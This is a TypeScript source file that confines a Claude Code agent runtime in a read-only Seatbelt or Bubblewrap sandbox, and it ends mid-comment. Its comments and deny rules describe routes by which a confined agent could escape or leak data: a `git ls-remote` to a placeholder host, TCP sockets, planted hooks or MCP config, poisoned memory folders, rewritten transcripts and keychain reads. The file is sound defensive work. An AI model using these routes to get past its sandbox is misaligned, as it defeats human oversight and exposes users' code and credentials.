import { spawn, type ChildProcess } from "node:child_process";
import { EventEmitter } from "node:events";
import {
  accessSync,
  constants,
  existsSync,
  mkdirSync,
  mkdtempSync,
  realpathSync,
  rmSync,
  statSync,
  symlinkSync,
} from "node:fs";
import { homedir, tmpdir } from "node:os";
import { isAbsolute, join, sep } from "node:path";

import type {
  Options as ClaudeAgentSdkOptions,
  SpawnedProcess,
  SpawnOptions,
} from "@anthropic-ai/claude-agent-sdk";
import type { ProviderExecutionPolicy, ProviderFailure } from "@octant/contracts";
import { Effect } from "effect";

import {
  prepareConfinedVersionProbe,
  type ConfinedVersionProbeLaunch,
} from "../process/confinedVersionProbe";
import {
  confinedExecutableExecPaths,
  DEFAULT_SANDBOX_PATH,
  escapeSeatbeltPath,
  makeProcessConfinementLive,
  ProcessConfinementError,
  seatbeltAllowLiteralReadRule,
  seatbeltExecRule,
  type ProcessConfinementPort,
} from "../process/seatbeltProfile";
import {
  materializeOsNetworkEgress,
  resolveProviderRuntimeEgressPolicy,
} from "../process/threadEgressPolicy";
import { canonicalClaudeAccountDirectory } from "./claudeAccountIsolation";
import { REQUIRED_GUARDS, sanitizeClaudeEnvironment } from "./claudeEnvironment";
import type { ProviderProcessStartedListener } from "./providerRuntimeRegistry";

export type SpawnClaudeCodeProcess = NonNullable<ClaudeAgentSdkOptions["spawnClaudeCodeProcess"]>;

/**
 * The one thread's authority a Claude runtime launch carries.
 *
 * The Agent SDK composes the launch and hands the spawn callback only command,
 * args, cwd, env, and a signal, so the bound root and the posture cannot be
 * read off `SpawnOptions`. They are bound here instead, at the call that opens
 * the query, which is the only place that knows them (0143, 0145).
 */
export interface ClaudeRuntimeConfinement {
  readonly projectRoot: string;
  readonly executionPolicy: ProviderExecutionPolicy;
  /**
   * Whether this launch offers the Bash tool. A Plan launch gets the shell and
   * read-only programs only then: Chat, Work and the readiness probes run the
   * same posture without a shell, and hiding the tool from the model would not
   * take the fork and exec grants away from the process.
   */
  readonly runsCommands?: boolean;
}

/**
 * The postures whose Claude runtime launches Octant confines itself.
 *
 * Plan is confined because 0009 requires its read-only boundary at the sandbox
 * rather than in the provider's permission layer. The postures that write still
 * run on the runtime's own sandbox settings and stay in the exception manifest
 * of `providerProcessConfinement.test.ts`; Full access is an unrestricted
 * posture 0009 never confines.
 */
export const CONFINED_CLAUDE_EXECUTION_POLICIES: ReadonlySet<ProviderExecutionPolicy> = new Set([
  "plan",
]);

export interface ClaudeProcessPort {
  readonly probeVersion: (binaryPath: string) => Effect.Effect<string, ProviderFailure>;
  /**
   * Whether the account is signed in. With a confinement, the check runs inside
   * the sandbox that launch will use: a sign-in the sandbox cannot read is no
   * sign-in for that launch, and an unconfined check cannot tell.
   */
  readonly probeSubscription: (
    binaryPath: string,
    environment: NodeJS.ProcessEnv,
    confinement?: ClaudeRuntimeConfinement,
  ) => Effect.Effect<"authenticated" | "unauthenticated", ProviderFailure>;
  /** Binds one thread's confinement to the callback the Agent SDK will invoke. */
  readonly spawn: (confinement: ClaudeRuntimeConfinement) => SpawnClaudeCodeProcess;
}

export interface ClaudeProcessOptions {
  readonly inheritedEnvironment?: NodeJS.ProcessEnv;
  readonly confinement?: ProcessConfinementPort;
  readonly onDiagnostic?: (message: string) => void;
  readonly probeOutputBytes?: number;
  readonly probeTimeoutMs?: number;
  readonly runtimeStderrBytes?: number;
  readonly shutdownTimeoutMs?: number;
  /** Called for each detached runtime child so the server can persist ownership. */
  readonly onProcessStarted?: ProviderProcessStartedListener;
}

const DEFAULT_PROBE_OUTPUT_BYTES = 4_096;
const DEFAULT_PROBE_TIMEOUT_MS = 5_000;
const DEFAULT_RUNTIME_STDERR_BYTES = 4_096;
const DEFAULT_SHUTDOWN_TIMEOUT_MS = 2_000;
const VERSION_PATTERN = /^(\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?)(?: \(Claude Code\))?\r?\n?$/;

type ProbeKind = "authentication" | "version";

interface ResolvedClaudeProcessOptions {
  readonly inheritedEnvironment: NodeJS.ProcessEnv;
  readonly confinement: ProcessConfinementPort;
  readonly onDiagnostic: ((message: string) => void) | undefined;
  readonly probeOutputBytes: number;
  readonly probeTimeoutMs: number;
  readonly runtimeStderrBytes: number;
  readonly shutdownTimeoutMs: number;
  readonly onProcessStarted: ClaudeProcessOptions["onProcessStarted"];
}

interface BoundedCapture {
  readonly bytes: Buffer;
  readonly overflow: boolean;
}

function failure(category: ProviderFailure["category"], message: string): ProviderFailure {
  return { category, message };
}

function validateBinaryPath(binaryPath: string): ProviderFailure | undefined {
  if (!isAbsolute(binaryPath)) {
    return failure("invalid-configuration", "Claude binary path must be absolute.");
  }
  try {
    const metadata = statSync(binaryPath);
    accessSync(binaryPath, constants.X_OK);
    if (!metadata.isFile()) throw new Error("not a file");
  } catch {
    return failure(
      "invalid-configuration",
      "Claude binary path must reference an executable file.",
    );
  }
  return undefined;
}

function wait(milliseconds: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

function processGroupExists(child: ChildProcess): boolean {
  if (child.pid === undefined) return false;
  try {
    process.kill(process.platform === "win32" ? child.pid : -child.pid, 0);
    return true;
  } catch (error) {
    return (error as NodeJS.ErrnoException).code !== "ESRCH";
  }
}

function signalProcessGroup(child: ChildProcess, signal: NodeJS.Signals): void {
  if (child.pid === undefined) return;
  try {
    if (process.platform === "win32") child.kill(signal);
    else process.kill(-child.pid, signal);
  } catch (error) {
    if ((error as NodeJS.ErrnoException).code !== "ESRCH") throw error;
  }
}

async function waitForProcessGroupExit(child: ChildProcess, timeoutMs: number): Promise<boolean> {
  const deadline = Date.now() + timeoutMs;
  while (processGroupExists(child) && Date.now() < deadline) await wait(10);
  return !processGroupExists(child);
}

function makeProcessTerminator(
  child: ChildProcess,
  shutdownTimeoutMs: number,
): (initialSignal?: NodeJS.Signals) => Promise<void> {
  let termination: Promise<void> | undefined;
  return (initialSignal = "SIGTERM") => {
    termination ??= (async () => {
      if (!processGroupExists(child)) return;
      signalProcessGroup(child, initialSignal);
      if (initialSignal === "SIGKILL") {
        if (!(await waitForProcessGroupExit(child, shutdownTimeoutMs))) {
          throw new Error("Claude process group did not terminate after SIGKILL.");
        }
        return;
      }
      if (await waitForProcessGroupExit(child, shutdownTimeoutMs)) return;
      signalProcessGroup(child, "SIGKILL");
      if (!(await waitForProcessGroupExit(child, shutdownTimeoutMs))) {
        throw new Error("Claude process group did not terminate after SIGKILL.");
      }
    })();
    return termination;
  };
}

function cleanupEffect(cleanup: () => Promise<void>): Effect.Effect<void> {
  return Effect.tryPromise({
    try: cleanup,
    catch: () => new Error("Claude process cleanup failed."),
  }).pipe(Effect.orDie);
}

function safeDiagnostic(handler: ClaudeProcessOptions["onDiagnostic"], message: string): void {
  try {
    handler?.(message);
  } catch {
    // Diagnostics cannot affect lifecycle or expose suppressed process output.
  }
}

function captureChunk(
  current: BoundedCapture,
  chunk: Buffer | string,
  limit: number,
): BoundedCapture {
  const bytes = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
  const remaining = Math.max(0, limit - current.bytes.length);
  return {
    bytes:
      remaining === 0
        ? current.bytes
        : Buffer.concat([current.bytes, bytes.subarray(0, remaining)]),
    overflow: current.overflow || bytes.length > remaining,
  };
}

function parseAuthenticationStatus(
  output: string,
): "authenticated" | "unauthenticated" | undefined {
  try {
    const value: unknown = JSON.parse(output);
    if (typeof value !== "object" || value === null || Array.isArray(value)) return undefined;
    const loggedIn = (value as { readonly loggedIn?: unknown }).loggedIn;
    return loggedIn === true ? "authenticated" : loggedIn === false ? "unauthenticated" : undefined;
  } catch {
    return undefined;
  }
}

function runProbe(
  binaryPath: string,
  args: readonly string[],
  environment: NodeJS.ProcessEnv,
  kind: "authentication",
  options: ResolvedClaudeProcessOptions,
  confinement?: ClaudeRuntimeConfinement,
): Effect.Effect<"authenticated" | "unauthenticated", ProviderFailure>;
function runProbe(
  binaryPath: string,
  args: readonly string[],
  environment: NodeJS.ProcessEnv,
  kind: "version",
  options: ResolvedClaudeProcessOptions,
): Effect.Effect<string, ProviderFailure>;
function runProbe(
  binaryPath: string,
  args: readonly string[],
  environment: NodeJS.ProcessEnv,
  kind: ProbeKind,
  options: ResolvedClaudeProcessOptions,
  confinement?: ClaudeRuntimeConfinement,
): Effect.Effect<string, ProviderFailure> {
  const invalid = validateBinaryPath(binaryPath);
  if (invalid !== undefined) return Effect.fail(invalid);

  // The version read is always confined. The authentication probe reaches the
  // provider's own control plane out of the user's credential home, which is a
  // readiness check under 0122 rather than a local string read, so on its own
  // it runs unconfined. A caller about to start a confined launch passes that
  // launch's confinement, and the probe then runs inside it.
  // Preparing inside the suspend keeps one scratch directory per run: an
  // Effect a caller holds and never runs leaves nothing behind, and one it runs
  // twice does not hand the second run a directory the first already released.
  return Effect.suspend(() => {
    const probe =
      kind === "version"
        ? prepareConfinedVersionProbe({
            binaryPath,
            displayName: "Claude",
            args,
            environment: () => environment,
            guards: REQUIRED_GUARDS,
            // The same port the runtime launch uses: one builder, two launches.
            confinement: options.confinement,
          })
        : undefined;
    if (probe?.status === "refused") return Effect.fail(failure(probe.reason, probe.message));
    let launch: ConfinedVersionProbeLaunch | undefined =
      probe?.status === "prepared" ? probe.launch : undefined;
    if (
      kind === "authentication" &&
      confinement !== undefined &&
      CONFINED_CLAUDE_EXECUTION_POLICIES.has(confinement.executionPolicy)
    ) {
      try {
        const confined = confineClaudeLaunch(
          {
            command: binaryPath,
            args: [...args],
            cwd: confinement.projectRoot,
            env: environment,
            signal: new AbortController().signal,
          },
          confinement,
          options,
        );
        launch = {
          command: confined.spawnOptions.command,
          args: confined.spawnOptions.args,
          workingDirectory: confinement.projectRoot,
          environment: confined.spawnOptions.env,
          release: confined.release,
        };
      } catch (error) {
        return Effect.fail(
          failure(
            "invalid-configuration",
            error instanceof ProcessConfinementError
              ? error.message
              : "Claude sign-in check could not be confined.",
          ),
        );
      }
    }

    return Effect.async<string, ProviderFailure>((resume) => {
      const child = spawn(
        launch?.command ?? binaryPath,
        launch === undefined ? args : [...launch.args],
        {
          ...(launch === undefined ? {} : { cwd: launch.workingDirectory }),
          detached: process.platform !== "win32",
          env: launch?.environment ?? environment,
          stdio: ["ignore", "pipe", "pipe"],
        },
      );
      let childExitedObserved = false;
      const childExited = new Promise<void>((resolveExit) =>
        child.once("exit", () => {
          childExitedObserved = true;
          resolveExit();
        }),
      );
      let ownershipReady: Promise<void> = Promise.resolve();
      if (child.pid !== undefined && options.onProcessStarted !== undefined) {
        ownershipReady = options
          .onProcessStarted({ pid: child.pid, exited: childExited })
          .then(() => undefined);
        void ownershipReady.catch(() => undefined);
      }
      const terminate = makeProcessTerminator(child, options.shutdownTimeoutMs);
      let stdout: BoundedCapture = { bytes: Buffer.alloc(0), overflow: false };
      let stderr: BoundedCapture = { bytes: Buffer.alloc(0), overflow: false };
      let settled = false;
      let cleanupPromise: Promise<void> | undefined;

      const cleanupListeners = () => {
        clearTimeout(timeout);
        child.stdout.off("data", onStdout);
        child.stderr.off("data", onStderr);
        child.off("error", onError);
        child.off("close", onClose);
      };
      const cleanupProcess = () => {
        // The scratch directory outlives the process it was granted to unless
        // it goes away with it, and every settle path here runs this.
        cleanupPromise ??= launch === undefined ? terminate() : terminate().finally(launch.release);
        return cleanupPromise;
      };
      const finish = (result: Effect.Effect<string, ProviderFailure>) => {
        if (settled) return;
        settled = true;
        cleanupListeners();
        void cleanupProcess().then(
          async () => {
            try {
              await ownershipReady;
              resume(result);
            } catch {
              if (childExitedObserved) resume(result);
              else
                resume(
                  Effect.fail(failure("provider-failed", "Claude process receipt is unavailable.")),
                );
            }
          },
          () => resume(Effect.fail(failure("provider-failed", "Claude probe cleanup failed."))),
        );
      };
      const onStdout = (chunk: Buffer | string) => {
        stdout = captureChunk(stdout, chunk, options.probeOutputBytes);
      };
      const onStderr = (chunk: Buffer | string) => {
        stderr = captureChunk(stderr, chunk, options.probeOutputBytes);
      };
      const onError = () =>
        finish(Effect.fail(failure("unavailable", `Claude ${kind} probe could not be started.`)));
      const onClose = (code: number | null) => {
        if (stdout.overflow || stderr.overflow) {
          finish(
            Effect.fail(failure("protocol", `Claude ${kind} probe output exceeded the limit.`)),
          );
          return;
        }
        if (kind === "version") {
          if (code !== 0) {
            finish(Effect.fail(failure("unavailable", "Claude version probe did not succeed.")));
            return;
          }
          const version = VERSION_PATTERN.exec(stdout.bytes.toString("utf8"))?.[1];
          finish(
            version === undefined
              ? Effect.fail(failure("protocol", "Claude binary returned an unrecognized version."))
              : Effect.succeed(version),
          );
          return;
        }

        const status = parseAuthenticationStatus(stdout.bytes.toString("utf8"));
        if (
          status === undefined ||
          (status === "authenticated" && code !== 0) ||
          (status === "unauthenticated" && code !== 1)
        ) {
          finish(
            Effect.fail(failure("protocol", "Claude authentication status response was invalid.")),
          );
          return;
        }
        finish(Effect.succeed(status));
      };
      const timeout = setTimeout(
        () => finish(Effect.fail(failure("unavailable", `Claude ${kind} probe timed out.`))),
        options.probeTimeoutMs,
      );

      child.stdout.on("data", onStdout);
      child.stderr.on("data", onStderr);
      child.once("error", onError);
      child.once("close", onClose);

      return cleanupEffect(async () => {
        if (!settled) {
          settled = true;
          cleanupListeners();
        }
        await cleanupProcess();
      });
    });
  });
}

/**
 * Refuse a runtime state path that is the checkout, sits inside it, or is an
 * ancestor of it, so a Plan launch cannot reopen the project through a state
 * grant (0145).
 */
function refuseStateOverlappingCheckout(
  boundRoot: string,
  paths: ReadonlyArray<string>,
): ReadonlyArray<string> {
  // A provider may create its state directory during launch. Resolve through
  // the nearest existing ancestor, so a not-yet-created leaf under a symlinked
  // prefix (`/tmp` is `/private/tmp` on macOS) cannot dodge the overlap check.
  const canonicalPaths = paths.map((path) => canonicalClaudeAccountDirectory(path).path);
  for (const path of canonicalPaths) {
    if (
      path === boundRoot ||
      path.startsWith(`${boundRoot}${sep}`) ||
      boundRoot.startsWith(`${path}${sep}`)
    ) {
      throw new ProcessConfinementError(
        "invalid-configuration",
        "Claude Plan confinement cannot grant a runtime state directory that overlaps the checkout.",
      );
    }
  }
  return canonicalPaths;
}

/**
 * The account's state directories: the configuration directory, and the
 * secure-storage directory when the host names one. A Plan launch reads them
 * whole and writes only what {@link planStateWriteRoots} grants inside the
 * configuration directory.
 */
function claudeAccountStateDirectories(environment: SpawnOptions["env"]): {
  readonly configuration: string | undefined;
  readonly secureStorage: string | undefined;
} {
  const configuration =
    environment.CLAUDE_CONFIG_DIR ??
    (environment.HOME === undefined ? undefined : join(environment.HOME, ".claude"));
  const secureStorage = environment.CLAUDE_SECURESTORAGE_CONFIG_DIR;
  return {
    configuration:
      configuration !== undefined && isAbsolute(configuration) ? configuration : undefined,
    secureStorage:
      secureStorage !== undefined && isAbsolute(secureStorage) ? secureStorage : undefined,
  };
}

/**
 * What a Plan launch may write in the configuration directory.
 *
 * Measured on macOS 27 with Claude Code 2.1.299, one Plan turn (its start,
 * three read-tool calls, the answer) wrote exactly these under `CLAUDE_CONFIG_DIR`:
 * `sessions/<pid>.json` and its `.key` files, the transcript under
 * `projects/<checkout>/<session>.jsonl`, plus `.claude.json` (through a lock,
 * a temporary file and a copy in `backups/`) and `.last-cleanup` at the top.
 * Only `sessions/` and the launch's own session in `projects/` are granted.
 * The top-level files are refused: the global `.claude.json` carries
 * per-project MCP servers, `settings.json` its hooks, and `skills/`,
 * `plugins/`, `agents/` and `commands/` what a later session loads, so a Plan
 * launch able to write any of them could plant code that runs on a later turn
 * outside this sandbox. A second measured Plan turn, under the earlier grant
 * of all of `projects/`, answered and completed with its `.claude.json` saves
 * and `.last-cleanup` refused, and its transcript still written to `projects/`.
 *
 * The rest of `projects/` holds other sessions' transcripts and the
 * per-project `memory/` folders a later session reads as instructions, so
 * none of it is granted. The grant is the session, not the checkout's folder,
 * because the runtime's folder name is not unique to a checkout:
 * `/tmp/team-project` and `/tmp/team/project` both become `-tmp-team-project`,
 * so a folder grant would let one checkout's Plan launch rewrite the other's
 * transcripts. A session's own folder `<session>/` beside its transcript holds
 * its subagent transcripts and saved tool results.
 */
const CLAUDE_PLAN_SESSIONS_FOLDER = "sessions";
const CLAUDE_PROJECTS_FOLDER = "projects";

/**
 * The session a launch writes, from the arguments the Agent SDK composes.
 *
 * Octant opens every session under an id it chose (`--session-id <id>`) or
 * resumes one (`--resume=<id>`), so the transcript's name is known before the
 * launch. Only a UUID is accepted, as the runtime itself requires, so an
 * argument cannot name a path. A launch that carries neither is granted no
 * session at all and its transcript write is refused.
 */
function claudeLaunchSessionIds(args: ReadonlyArray<string>): ReadonlyArray<string> {
  const ids = new Set<string>();
  for (const [index, arg] of args.entries()) {
    const value =
      arg === "--session-id" || arg === "--resume"
        ? args[index + 1]
        : arg.startsWith("--session-id=") || arg.startsWith("--resume=")
          ? arg.slice(arg.indexOf("=") + 1)
          : undefined;
    if (
      value !== undefined &&
      /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(value)
    ) {
      ids.add(value);
    }
  }
  return [...ids];
}

/**
 * The runtime's folder name under `projects/` for a working directory.
 *
 * The runtime keys a session's folder by the canonical, NFC-normalized working
 * directory it started in, with every character outside `[a-zA-Z0-9]` replaced
 * by `-`. A name longer than 200 characters keeps its first 200 and gains `-`
 * and a base-36 hash of the full path. Read from the bundled runtime of Claude
 * Code 2.1.300 (Agent SDK 0.3.211), whose CLI and SDK share this rule; the
 * hash is the 32-bit `h * 31 + code unit` string hash both spell out.
 */
function claudeProjectFolderName(workingDirectory: string): string {
  const sanitized = workingDirectory.replace(/[^a-zA-Z0-9]/g, "-");
  if (sanitized.length <= 200) return sanitized;
  let hash = 0;
  for (let index = 0; index < workingDirectory.length; index += 1) {
    hash = (hash << 5) - hash + workingDirectory.charCodeAt(index);
    hash |= 0;
  }
  return `${sanitized.slice(0, 200)}-${Math.abs(hash).toString(36)}`;
}

/**
 * Where a Plan launch may write outside the checkout.
 *
 * The folders are made here, outside the sandbox, because the configuration
 * directory itself is no longer writable to the launch, and Bubblewrap can bind
 * only a folder that exists. The session's transcript file is not made: the
 * runtime refuses a new `--session-id` whose transcript already exists.
 * Seatbelt grants the path before it exists; Bubblewrap binds only what
 * exists, so on Linux a new session's transcript is refused and a resumed
 * one's is written. On a host that keeps the subscription sign-in in
 * a file rather than the macOS Keychain, the runtime refreshes that one file,
 * `.credentials.json` in the secure-storage directory (the configuration
 * directory when none is named), and it stays writable so a refreshed login
 * is kept (a maintainer decision of 2026-10-14, accepting that such a launch
 * could replace the stored login). It is the only file granted, and only where
 * it is the login: a launch with an API key, or on macOS, gets none.
 */
function planStateWriteRoots(
  boundRoot: string,
  workingDirectory: string,
  sessionIds: ReadonlyArray<string>,
  environment: SpawnOptions["env"],
  readsSignInFromKeychain: boolean,
): { readonly readRoots: ReadonlyArray<string>; readonly writeRoots: ReadonlyArray<string> } {
  const { configuration, secureStorage } = claudeAccountStateDirectories(environment);
  const readRoots = refuseStateOverlappingCheckout(
    boundRoot,
    [configuration, secureStorage].filter((path): path is string => path !== undefined),
  );
  if (configuration === undefined) return { readRoots, writeRoots: [] };
  // The runtime names the folder after the directory it starts in. Seatbelt
  // starts it in the launch's `cwd`, and Bubblewrap in the bound root, so both
  // names are used when they differ.
  const projectFolders = [
    ...new Set(
      [workingDirectory, boundRoot].map((directory) =>
        join(
          configuration,
          CLAUDE_PROJECTS_FOLDER,
          claudeProjectFolderName(directory.normalize("NFC")),
        ),
      ),
    ),
  ];
  const sessionFolders = projectFolders.flatMap((folder) =>
    sessionIds.map((id) => join(folder, id)),
  );
  const sessionsFolder = join(configuration, CLAUDE_PLAN_SESSIONS_FOLDER);
  try {
    for (const folder of [sessionsFolder, ...sessionFolders]) {
      mkdirSync(folder, { recursive: true, mode: 0o700 });
    }
  } catch {
    throw new ProcessConfinementError(
      "invalid-configuration",
      "Claude Plan confinement could not create the runtime's session folders.",
    );
  }
  const transcripts = sessionFolders.map((folder) => `${folder}.jsonl`);
  const credentialsFile =
    readsSignInFromKeychain || environment.ANTHROPIC_API_KEY !== undefined
      ? []
      : [join(secureStorage ?? configuration, ".credentials.json")];
  // Resolved again after creation: a folder that is a link into the checkout
  // is refused like the configuration directory itself.
  return {
    readRoots,
    writeRoots: refuseStateOverlappingCheckout(boundRoot, [
      sessionsFolder,
      ...transcripts,
      ...sessionFolders,
      ...credentialsFile,
    ]),
  };
}

/**
 * The global configuration file of an account with no assigned directory.
 *
 * With no `CLAUDE_CONFIG_DIR` the runtime keeps it in `~/.claude.json`, beside
 * the account folder rather than inside it. Measured on macOS 27.0.1 with
 * Claude Code 2.1.301: refused that one read, the runtime retries it for about
 * six seconds before it goes on, which outlasts the sign-in probe's five. The
 * grant is for that one file, so it is returned only when the path resolves,
 * through any links, to a regular file outside the checkout; a link to a
 * folder, a missing file or a path into the checkout gets no grant, and the
 * caller reads it by literal path, never as a subtree. With the variable set,
 * the file sits inside the configuration directory, which is read whole.
 */
function claudeGlobalConfigurationFile(
  boundRoot: string,
  environment: SpawnOptions["env"],
): string | undefined {
  const home = environment.HOME;
  if (
    process.platform !== "darwin" ||
    environment.CLAUDE_CONFIG_DIR !== undefined ||
    home === undefined ||
    !isAbsolute(home)
  ) {
    return undefined;
  }
  try {
    const resolved = realpathSync(join(home, ".claude.json"));
    if (!statSync(resolved).isFile()) return undefined;
    if (
      resolved === boundRoot ||
      resolved.startsWith(`${boundRoot}${sep}`) ||
      boundRoot.startsWith(`${resolved}${sep}`)
    ) {
      return undefined;
    }
    return resolved;
  } catch {
    return undefined;
  }
}

/**
 * The one Keychain file a confined subscription launch may read on macOS.
 *
 * Exported so the driver can refuse a file tool that names its folder: the
 * sandbox opens this file to the runtime's own sign-in read, not to the model.
 */
export function claudeLoginKeychainPath(): string {
  let home = homedir();
  try {
    home = realpathSync(home);
  } catch {
    // A home that cannot be resolved names no file the profile could open.
  }
  return join(home, "Library", "Keychains", "login.keychain-db");
}

/**
 * Whether a Plan turn's runtime may run read-only commands on this platform.
 *
 * Only the Seatbelt profile can name the programs a shell may start. Linux
 * Plan launches load the seccomp filter that refuses every process-creating
 * fork (0068), so a shell there could start nothing and the Bash tool is not
 * offered.
 */
export function claudePlanRunsCommands(platform: NodeJS.Platform = process.platform): boolean {
  return platform === "darwin";
}

/**
 * The shell a Plan turn's Bash tool runs in.
 *
 * The runtime's Bash tool refuses to start without bash or zsh ("No suitable
 * shell found"), and `CLAUDE_CODE_SHELL` pins it to this one so the profile
 * names a single shell. `/bin/sh` and `/bin/bash` stay refused: Git starts
 * every configured command that carries arguments through `/bin/sh -c`, so
 * without it a repository's `core.fsmonitor`, `core.pager`, textconv or
 * `!`-alias cannot start, and bash's built-in `/dev/tcp` is not reachable.
 */
const CLAUDE_PLAN_SHELL = "/bin/zsh";

/**
 * The system programs a Plan turn's shell may run. Each one reads files and
 * prints; none can write past the profile's write rules, and the ones that
 * start programs (`find -exec`, `xargs`) start only programs on this list.
 * `awk`'s `system()` goes through `/bin/sh`, which is refused.
 */
const CLAUDE_PLAN_SYSTEM_COMMANDS = [
  "/bin/cat",
  "/bin/ls",
  "/bin/realpath",
  "/usr/bin/awk",
  "/usr/bin/basename",
  "/usr/bin/cut",
  "/usr/bin/diff",
  "/usr/bin/dirname",
  "/usr/bin/file",
  "/usr/bin/find",
  "/usr/bin/grep",
  "/usr/bin/head",
  "/usr/bin/sed",
  "/usr/bin/sort",
  "/usr/bin/stat",
  "/usr/bin/tail",
  "/usr/bin/tr",
  "/usr/bin/uniq",
  "/usr/bin/wc",
  "/usr/bin/xargs",
] as const;

/** Programs looked up on the launch's `PATH`, as the shell would find them. */
const CLAUDE_PLAN_SEARCHED_COMMANDS = ["git", "rg"] as const;

/**
 * The developer-tools shim macOS puts first on most `PATH`s. It is not Git: it
 * looks up the active developer folder and, for an Xcode, runs `xcodebuild` to
 * check its first-launch state before it starts the real Git. Measured on
 * macOS 27.0.1 under this profile, every `git` call through it failed: first
 * reading `/var/select/developer_dir`, which `/private` denies, and with that
 * opened, with "couldn't spawn '.../usr/bin/xcodebuild'". The shim is
 * therefore not allowed at all; the real Git is, and a `git` beside the
 * launch's temporary directory, put first on `PATH`, points at it.
 */
const DEVELOPER_TOOLS_GIT_SHIM = "/usr/bin/git";

/**
 * The real Git the shim would start: the folder `DEVELOPER_DIR` names, then
 * the `xcode-select` link, the default Xcode, and the Command Line Tools, the
 * first that holds one. The link alone is not enough: on the measured host it
 * named an Xcode that was no longer installed.
 */
function developerGit(environment: SpawnOptions["env"]): string | undefined {
  return [
    environment.DEVELOPER_DIR,
    "/var/db/xcode_select_link",
    "/Applications/Xcode.app/Contents/Developer",
    "/Library/Developer/CommandLineTools",
  ]
    .filter((directory): directory is string => directory !== undefined && isAbsolute(directory))
    .map((directory) => join(directory, "usr", "bin", "git"))
    .find(isExecutableFile);
}

/**
 * The executable files a Plan turn's shell may start, each in its literal and
 * resolved form, since Seatbelt judges the resolved path, and the real Git to
 * put first on `PATH` when the `git` the shell would find is the shim.
 *
 * A program found on `PATH` is dropped when it resolves into the checkout or
 * any folder the launch may write: a checkout that ships its own `git` on a
 * `PATH` entry would otherwise run its own code under the name of a read.
 */
function planCommandPrograms(
  environment: SpawnOptions["env"],
  confinedRoots: ReadonlyArray<string>,
): { readonly programs: ReadonlyArray<string>; readonly gitBehindShim: string | undefined } {
  const searchPath = (environment.PATH ?? "").split(":").filter((entry) => isAbsolute(entry));
  let gitBehindShim: string | undefined;
  const found = CLAUDE_PLAN_SEARCHED_COMMANDS.flatMap((name) => {
    const first = searchPath.map((entry) => join(entry, name)).find(isExecutableFile);
    if (first === undefined) return [];
    if (name === "git" && first === DEVELOPER_TOOLS_GIT_SHIM) {
      gitBehindShim = developerGit(environment);
      return gitBehindShim === undefined ? [] : [gitBehindShim];
    }
    return [first];
  });
  const programs = new Set<string>();
  for (const candidate of [CLAUDE_PLAN_SHELL, ...CLAUDE_PLAN_SYSTEM_COMMANDS, ...found]) {
    if (!isExecutableFile(candidate)) continue;
    let resolved: string;
    try {
      resolved = realpathSync(candidate);
    } catch {
      continue;
    }
    const insideConfinedRoot = [candidate, resolved].some((path) =>
      confinedRoots.some((root) => path === root || path.startsWith(`${root}${sep}`)),
    );
    if (insideConfinedRoot) {
      if (candidate === gitBehindShim) gitBehindShim = undefined;
      continue;
    }
    programs.add(candidate);
    programs.add(resolved);
  }
  return { programs: [...programs], gitBehindShim };
}

function isExecutableFile(path: string): boolean {
  try {
    if (!statSync(path).isFile()) return false;
    accessSync(path, constants.X_OK);
    return true;
  } catch {
    return false;
  }
}

function seatbeltAnyProcessPath(paths: ReadonlyArray<string>): string {
  return `(require-any ${paths.map((path) => `(process-path "${escapeSeatbeltPath(path)}")`).join(" ")})`;
}

function seatbeltAnyLiteral(paths: ReadonlyArray<string>): string {
  return `(require-any ${paths.map((path) => `(literal "${escapeSeatbeltPath(path)}")`).join(" ")})`;
}

/**
 * The Seatbelt rules that let a Plan turn's shell run read-only commands
 * without taking the runtime's own reach.
 *
 * A rule's `process-path` is the program of the process asking, so these
 * rules hold the runtime's reach to the runtime's own image:
 *
 * - The account's state directories stay the runtime's to read. They hold
 *   every session's transcript, from every checkout the account has opened,
 *   which the driver keeps the file tools out of and a `cat` would not be.
 * - Writes outside the launch's temporary directory stay the runtime's. The
 *   session transcript and `sessions/` records are granted for the runtime
 *   to keep its session; a command that rewrote the transcript could put
 *   words in the person's mouth for a later, writing turn that resumes it.
 *   `/dev` is left to the profile's own rules.
 * - Network stays the runtime's, which calls its provider. A shell or a tool
 *   it starts reaches no host, so `git ls-remote git://host/<secret>` or a
 *   `zsh/net/tcp` socket cannot carry a checkout file anywhere.
 * - The runtime's own program can be started only by `sandbox-exec`, for the
 *   launch, and by the runtime itself. A shell that started a second runtime
 *   would get that network and could be pointed at any host through its
 *   environment.
 * - `/usr/bin/security` and the login keychain file serve the runtime's
 *   sign-in read, and a shell may neither run the one nor read the other.
 *
 * Measured on macOS 27.0.1: `process-path` in a `process-exec` rule names the
 * caller, not the program being started (a rule denying `/bin/echo` for the
 * caller `/bin/zsh` refused `zsh -c /bin/echo` and let `bash -c /bin/echo`
 * run), and the launch's own exec is asked by `/usr/bin/sandbox-exec`.
 */
function planCommandRules(
  runtimePrograms: ReadonlyArray<string>,
  commandPrograms: ReadonlyArray<string>,
  temporaryDirectory: string,
  accountDirectories: ReadonlyArray<string>,
): ReadonlyArray<string> {
  const runtime = seatbeltAnyProcessPath(runtimePrograms);
  return [
    ...commandPrograms.map(seatbeltExecRule),
    ...accountDirectories.map(
      (directory) =>
        `(deny file-read* (require-all (subpath "${escapeSeatbeltPath(directory)}") (require-not ${runtime})))`,
    ),
    `(deny file-write* (require-all (require-not ${runtime}) (require-not (subpath "${escapeSeatbeltPath(temporaryDirectory)}")) (require-not (subpath "/dev"))))`,
    `(deny process-exec (require-all ${seatbeltAnyLiteral(runtimePrograms)} (require-not ${seatbeltAnyProcessPath([DEFAULT_SANDBOX_PATH, ...runtimePrograms])})))`,
    `(deny network* (require-not ${runtime}))`,
    `(deny process-exec (require-all (literal "/usr/bin/security") (require-not ${runtime})))`,
    `(deny file-read* (require-all (literal "${escapeSeatbeltPath(claudeLoginKeychainPath())}") (require-not ${seatbeltAnyProcessPath(["/usr/bin/security", ...runtimePrograms])})))`,
  ];
}

/**
 * The environment a Plan turn's shell starts Git with.
 *
 * Git reads the system and global configuration and the repository's own,
 * and a configured `core.fsmonitor` runs on every `git status` and `git diff`.
 * These pin the fsmonitor off, skip the system and global files and the
 * per-user ignore and attributes files, stop Git
 * taking the optional index lock (which the profile would refuse anyway), and
 * keep the pager and credential prompts out. They guard against a command
 * started by accident; a command the model sets them aside for is still held
